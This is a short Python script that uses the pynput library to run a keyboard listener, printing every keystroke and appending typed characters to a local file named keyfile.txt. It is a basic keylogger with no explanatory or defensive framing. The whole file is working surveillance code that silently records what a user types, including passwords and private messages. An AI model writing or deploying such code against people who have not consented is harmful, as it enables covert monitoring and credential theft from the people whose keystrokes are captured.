from pynput import keyboard

def on_press(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)  
        except :
            print("error getting char")

if __name__ == "__main__":
   listner = keyboard.Listener(on_press=on_press)
   listner.start()
   input()